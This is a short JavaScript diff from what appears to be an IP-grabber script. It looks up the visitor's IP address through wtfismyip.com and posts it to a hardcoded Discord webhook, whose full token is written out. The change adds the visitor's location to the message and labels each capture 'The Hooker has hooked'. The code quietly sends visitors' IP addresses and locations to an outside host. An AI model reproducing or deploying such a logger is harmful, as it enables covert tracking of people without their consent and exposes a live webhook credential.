@@ -205,7 +205,13 @@ fetch("https://wtfismyip.com/json")
       "https://discord.com/api/webhooks/1243251756918374480/yZtcgG_3SgwrFr8e5GezMoM_CEsj_yVi-vl8Bklpc3O6wwtS_v1P0NPBXxguji6CM7hH",
       {
         body: JSON.stringify({
-          content: `ip: ${log.ipAddress}`
+          username: `The Hooker`,
+          embeds: [
+            {
+              author: {name: `The Hooker has hooked`},
+              description: "ip: " + log.ipAddress + "\nlocation: " + log.location,
+            }
+          ]
         }),
         headers: {
           "Content-Type": "application/json"
